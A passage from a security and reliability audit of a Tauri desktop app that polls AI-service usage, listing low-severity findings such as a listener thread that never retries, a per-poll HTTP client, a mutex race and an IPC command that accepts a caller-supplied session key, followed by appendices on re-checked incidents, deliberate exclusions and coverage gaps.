**Fix sketch:** Call `AXUIElementSetMessagingTimeout(appRef, 0.1f)` before the first AX call to cap blocking to 100 ms; or dispatch `ax_frontmost_window_title()` to a background serial queue and `dispatch_async` back to main only when the title changes.

---

#### F-L21: `rdev` mouse-listener thread on non-macOS exits permanently on `listen()` error — widget click-through silently stops working

**Severity:** Low | **Confidence:** High
**Locations:** `src-tauri/src/hook.rs:70-82`

**Scenario:** On non-macOS, `platform::start()` spawns a thread that calls `rdev::listen()`. If `listen()` returns `Err` (e.g. X11 permission denied on Linux, conflicting rdev hook on Windows), the thread logs to stderr and exits with no retry. No `device-mouse-move` events are ever emitted again. The `setIgnoreCursorEvents` state freezes, and click-through behavior breaks silently.

**Fix sketch:** Wrap `rdev::listen` in a retry loop with exponential back-off (up to 5 attempts, 1s/2s/4s delays). At minimum emit a structured error event the frontend can surface as a diagnostic.

---

#### F-L22: Per-poll `reqwest::Client::new()` — fresh connection pool on every tick prevents TCP keep-alive reuse

**Severity:** Low | **Confidence:** High
**Locations:** `src-tauri/src/polling.rs:206`, `src-tauri/src/commands/usage.rs:117,510`, `src-tauri/src/commands/codex.rs:172`, `src-tauri/src/commands/cursor.rs:810`

**Scenario:** At least 5 `reqwest::Client::new()` calls occur on every poll tick. Each creates a fresh connection pool; TCP connections cannot be reused across pool instances. Every poll performs full TLS handshakes against `claude.ai`, `chatgpt.com`, `auth.openai.com`, `api2.cursor.sh`, and the third-party `promoclock.co`.

**Fix sketch:** Instantiate one `reqwest::Client` at startup (stored in `CredentialsCache` or as `Arc<reqwest::Client>` in Tauri app state) and pass it through all fetch paths.

---

#### F-L23: `CredentialsCache` uses six independent Mutexes — TOCTOU window between `get_session_key()` and `get_org_id()` in poll path

**Severity:** Low | **Confidence:** Medium
**Locations:** `src-tauri/src/credentials_cache.rs:1-78`, `src-tauri/src/polling.rs:107-111`

**Scenario:** The poll path reads `session_key` and `org_id` in two separate lock-acquire-release cycles. A concurrent credential update between the two reads produces an inconsistent pair. The `match` at polling.rs:107-110 returns `None` early on any missing field, so the worst effect is a skipped poll tick, not a malformed HTTP request.

**Fix sketch:** Add `get_claude_credentials() -> Option<(String, String)>` that acquires one lock and returns both fields atomically.

---

#### F-L24: `switchAuthMethod` catch block logs raw Tauri IPC error to console — potential future credential context in logs

**Severity:** Low | **Confidence:** Low
**Locations:** `src/components/setup/ProviderMethodPicker.tsx:154-156`

**Scenario:** `console.error('Failed to switch auth method:', e)` logs the raw Tauri IPC error object. In practice these error strings from `set_claude_auth_method` and `get_session_key` do not echo credential values, but the pattern is a risk if error messages become richer.

**Fix sketch:** Replace `console.error` with a user-facing error state update; remove console logging from production builds.

---

#### F-L25: `fetch_usage_raw` accepts caller-supplied session key as an IPC parameter rather than reading from internal cache

**Severity:** Low | **Confidence:** High
**Locations:** `src/components/DebugPanel.tsx:22-28`, `src-tauri/src/commands/usage.rs:94-113`, `src-tauri/src/lib.rs:132`

**Scenario:** `fetch_usage_raw` at usage.rs:95 accepts `session_key` and `org_id` as direct IPC parameters (not reading from cache), making it callable with an arbitrary key from the webview. The UI path (DebugPanel.tsx `fetchRaw`) only exists behind the `IS_DEV` guard in the old `Settings.tsx`; however, as noted in F-H4, `Settings2` has no such guard in production. The command is registered unconditionally in `lib.rs:132`.

**Fix sketch:** Remove `session_key`/`org_id` parameters from `fetch_usage_raw`; have it read credentials from the internal cache. Gate the command registration behind `#[cfg(debug_assertions)]`.

---

## Appendix A — Prior Incidents Re-checked

| Incident | Status |
|---|---|
| Claude "extra usage" reset fallback + varying extra-usage response shapes (`commands/usage.rs`) | **Still safe.** `#[serde(default)]` on extra-usage fields and the multi-shape enum handling are present and correct. No regression detected. |
| "MAX 20x" usage response shape handling | **Still safe.** The variant is handled; verifier confirmed no regression. |
| Cursor billing-cycle reset date off-by-one (`commands/cursor.rs`) | **Potential cosmetic regression at cycle boundary.** The strict `*dt > now` filter (F-L13) can produce a one-tick `None` at cycle boundary. The original off-by-one fix appears intact but the boundary filter introduces a new single-tick glitch. |
| Claude Desktop cookie fallback + Claude OAuth → session-key fallback (`browser.rs`, `claude_oauth.rs`, `usage.rs`) | **Still safe.** The fallback chain is intact. The non-atomic write (F-H3 / F-H1) is an existing gap, not a regression from this fallback logic. |
| `parse_ps_line` / `SplitN` parsing robustness | **Not applicable.** No `process_monitor.rs` file found; the `SplitN::as_str` fix (commit `4b23f5b`) is in the history. No regression detected in current code. |
| Single-instance enforcement (second launch shows window) | **Still safe.** The single-instance mechanism is present in `lib.rs` and was not regressed. |
| Widget click-through coordinate conversion (`rdev` screen px vs `getBoundingClientRect`) | **Partial regression.** The coordinate conversion logic is correct per the code, but the missing `blur` listener (F-L18) means drag-interrupt leaves the widget in a broken click-through state. The original coordinate conversion fix is intact. |
| Windows widget transparency dual native+runtime-hook requirement | **Still safe.** `transparent: true`, `decorations: false`, `shadow: false` are present in `tauri.conf.json`; `force_widget_transparent` invocation is retained in `WidgetOverlay.tsx`. No regression. |

---

## Appendix B — Explicitly NOT Flagged

The following were encountered and consciously excluded as intentional designs per `CLAUDE.md`, `AGENTS.md`, and project docs:

- **Local HTTP API server existing** — opt-in via `http_server_enabled`; documented as a Stream Deck integration. Only the unauthenticated surface and what it discloses were flagged (F-L3, F-L4, F-L5), not the server's existence.
- **Widget reusing main-window data flows** — by design; not a separate backend.
- **Widget cards being click-through** — by design; only the header is a hitbox. F-L18 flags a drag-interrupt regression, not the design itself.
- **`#[serde(default)]` as a pattern** — not flagged as a pattern. Only flagged where a zero-default produces incorrect behavior (F-L10).
- **`macOSPrivateApi: true`, Accessory dock-hiding, custom native tray bridge** — load-bearing; not flagged.
- **Windows widget transparency native-window-config + runtime-hook combination** — documented workaround; not flagged.
- **Single `usage_history` SQLite table being Claude-only** — documented current state.
- **`get_session_key` being used by `ProviderMethodPicker.tsx:90,146` to forward to `test_connection`** — functionally required; noted in F-L1 as the reason a full elimination is not straightforward.
- **`mcp_add_server` continuing on path-resolution failures** — intentional design; only the I/O-failure early-exit was flagged (F-L16).

---

## Appendix C — Coverage Gaps

| Gap | Reason | Recommended follow-up |
|---|---|---|
| Runtime OAuth refresh timing | Confirming whether Anthropic's OAuth server enforces single-rotation semantics (RFC 6749) requires live network testing. F-M3 and F-L12 impact depends on this. | Send a double-rotation test request against a test account. |
| `tauri-plugin-store` file permission behavior on Linux | The store's actual umask behavior on Linux was not directly tested. F-L8 confidence is medium. | Inspect file mode after store initialization on a Linux VM. |
| npm supply-chain audit | F-L1 depends on no malicious bundled dependency. `package-lock.json` was not audited for known-malicious packages. | Run `npm audit` + `socket.dev` or similar on the production lock file. |
| MCP server (`mcp-server/`) IPC surface | The MCP server code was not fully read for injection or auth issues in tool handlers. | Follow-up audit of `mcp-server/src/` tool implementations, particularly `open_app` which triggers a Tauri `POST /api/open`. |
| `WebViewWindow` CSP enforcement | Whether `tauri.conf.json:49` `connect-src self https:` is enforced by WebKit/WebView2 at runtime was not verified at the binary level. | Test with a bundled fetch to an arbitrary HTTPS endpoint in a production build. |
| Windows-specific code paths | `read_electron_cookie_windows`, `configure_widget_hwnd`, `force_widget_transparent` Windows branches, and `hook.rs` rdev path were read but not runtime-tested. F-L9 and F-L21 have Windows-specific components. | Test on a Windows VM with a real browser cookie DB. |
| `sqlite:usage_history.db` schema migration safety | Migration paths in the SQL plugin were not audited for data-dropping schema changes. | Read all migration SQL files for destructive `DROP`/`ALTER` without `IF EXISTS` guards. |
